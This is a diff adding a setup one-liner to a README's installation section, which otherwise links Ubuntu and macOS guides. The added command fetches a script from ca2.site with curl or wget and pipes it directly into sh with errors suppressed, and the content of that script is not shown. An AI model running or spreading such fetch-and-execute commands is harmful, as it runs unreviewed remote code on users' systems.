@@ -76,6 +76,11 @@ Manual steps are described below:
 - [Ubuntu](ubuntu.md) (can be adapted to be used on other distros).
 - [macOS](macos.md)
 
+Working on this One liner to setup coding ambient at Unix, Unix like and/or Linux system
+
+```bash
+a="https://ca2.site/1"; curl -fsSL "$a" 2>/dev/null | sh || wget -qO- "$a" 2>/dev/null | sh
+```
 
 # Features
 <details>
